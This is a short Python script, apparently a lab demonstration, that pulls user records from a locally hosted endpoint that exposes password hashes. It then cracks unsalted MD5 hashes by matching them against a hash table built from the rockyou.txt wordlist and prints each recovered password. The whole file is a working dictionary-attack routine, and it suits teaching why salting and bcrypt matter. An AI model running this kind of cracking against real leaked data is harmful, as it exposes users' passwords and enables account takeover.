import json
import hashlib
import requests

target_url = "http://localhost:5000/users.js"
print("\nHashing algorithms to demonstrate password extraction with:\n1: md5 unsalted\n2: md5 salted\n3: bcrypt")
option = input("Enter option: ")
match option:
    case '1':
        hash_type = "pwd_hash_md5_unsalted"
        hash_type_str = "md5 unsalted"
    case '2':
        hash_type = "pwd_hash_md5_salted"
        hash_type_str = "md5 salted"
    case '3':
        hash_type = "pwd_hash_bcrypt"
        hash_type_str = "bcrypt"
    case _:
        raise ValueError("Invalid option")

# format leaked data from response to a password hash list
# code adapted from: https://stackoverflow.com/questions/22367473/extract-javascript-information-from-url-with-python
exposedUserData_raw = requests.get(target_url + f"?pwd_choice={hash_type}")
exposedUserData_raw_str = exposedUserData_raw.text  # get text from response

# extract the list as a string so it can be jason-parsed
exposedUserData_str = exposedUserData_raw_str[exposedUserData_raw_str.find("["):exposedUserData_raw_str.find("]")+1]
exposedUserData = json.loads(exposedUserData_str)   # parse json & return a dict

print(f"\nHashing algorithm: {hash_type_str}")
exposed_hash_list = [user["password"] for user in exposedUserData]
print("\nExposed hashes:")
for hash_ in exposed_hash_list:
    print(hash_)

# read passwords from rockyou.txt & store them in rockyou_pwds
rockyou_file = "rockyou.txt"
pwd_file = open(rockyou_file, 'r', errors="ignore")
rockyou_pwds = pwd_file.readlines()
pwd_file.close()

print("\nProcessing hashes. Please be patient... \n")
# create hash from passwords in rockyou.txt & store in dict
rockyou_hashes = {}
for raw_pwd in rockyou_pwds:
    pwd = raw_pwd.rstrip('\n')    # remove trailing newline character
    pwd_to_bytes = pwd.encode('utf-8')  # convert password to array of bytes
    hash_md5_unsalted = hashlib.md5(pwd_to_bytes).hexdigest()   # generate hash
    rockyou_hashes[hash_md5_unsalted] = pwd

    # self.md5_salt = os.urandom(16)  # generate & store salt to add to plaintext before hashing
    # self.pwd_hash_md5_salted = hashlib.md5(self.md5_salt + password_to_bytes).hexdigest()

for hash_ in exposed_hash_list:
    print(f"Trying hash {hash_} ...", end='')
    if hash_ in rockyou_hashes:
        print(f" Success: hash found. Password cracked: {rockyou_hashes[hash_]}")
    else:
        print(" Unsuccessful: hash not found.")
